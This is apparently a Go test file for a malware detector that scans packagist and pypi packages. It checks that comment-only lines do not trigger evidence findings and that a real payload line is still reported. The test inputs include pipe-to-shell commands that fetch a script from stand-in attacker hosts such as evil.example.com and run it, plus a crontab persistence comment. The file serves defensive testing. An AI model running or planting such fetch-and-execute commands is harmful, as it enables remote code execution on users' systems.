package detect

import "testing"

// A comment cannot be a behaviour. Measured on production 2026-08-08 by replaying the
// lines packagist and pypi malware mints actually matched back through the engine, the
// recurring live false positive was a rule firing on documentation ABOUT the behaviour
// it detects — in packages that are the opposite of malware. Every line below is
// verbatim from CVEMetadata.rawDataJSON.
func TestCommentLinesDoNotMintFindings(t *testing.T) {
	cases := map[string]string{
		"P-TELEGRAM-BOT phpdoc": "<?php\n" +
			"/**\n" +
			" * You should set [telegram bot token](https://core.telegram.org/bots#botfather) and chatId in your config.\n" +
			" */\n",
		"P-CRON-CREATE phpdoc": "<?php\n/**\n * CronManager provides easy access to the crontable\n */\n",
		"P-URL-SHORTENER link":  "<?php\n/**\n * @link http://bit.ly/hg3gHb\n */\n",
		"P-CRYPTO-WALLET hash":  "#                \"contractAddress\": \"0x64bc2ca1be492be7185faa2c8835d9b824c8a194\"\n",
		"P-AT-JOB prose":        "# 2026 March equinox is ~14:46 UTC Mar 20; at 12:08 UTC (solar noon)\n",
		"slash-slash":           "// curl https://example.com/install.sh | sh\n",
		"html comment":          "<!-- crontab -e adds the persistence entry -->\n",
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			f := Detect(&PackageContext{Name: "vendor/pkg", Ecosystem: "packagist", PkgbuildContent: src})
			for _, fi := range f {
				if fi.Class == ClassEvidence {
					t.Errorf("comment-only content produced evidence-class finding %s (line %q)",
						fi.ID, fi.MatchedLine)
				}
			}
		})
	}
}

// The guard must not let a real payload hide behind a comment elsewhere in the file.
// reportableLine suppresses only when EVERY matching line is suppressed.
func TestCommentGuardDoesNotMaskExecutableLine(t *testing.T) {
	src := "# the installer used to do: curl https://evil.example.com/x.sh | sh\n" +
		"curl https://evil.example.com/x.sh | sh\n"
	f := Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: src, PkgbuildExecutes: true})
	found := false
	for _, fi := range f {
		if fi.MatchedLine == "curl https://evil.example.com/x.sh | sh" {
			found = true
		}
	}
	if !found {
		t.Errorf("the executable line was not reported; findings=%v", ids(f))
	}
}

func TestIsCommentLine(t *testing.T) {
	comments := []string{
		"# shell comment", "  // js comment", "/* block open", "*/",
		"<!-- html -->", "-- sql comment", "* phpdoc continuation",
	}
	for _, s := range comments {
		if !IsCommentLine(s) {
			t.Errorf("IsCommentLine(%q) = false, want true", s)
		}
	}
	// Code that merely starts with a comment-adjacent character.
	code := []string{
		"*) curl https://evil/x | sh ;;", // shell case label, not a comment
		"--flag=value",                   // a CLI flag, not SQL
		"$x = 1;",
		"exec($cmd);",
		"",
		"*/*.php", // a glob
	}
	for _, s := range code {
		if IsCommentLine(s) {
			t.Errorf("IsCommentLine(%q) = true, want false", s)
		}
	}
}
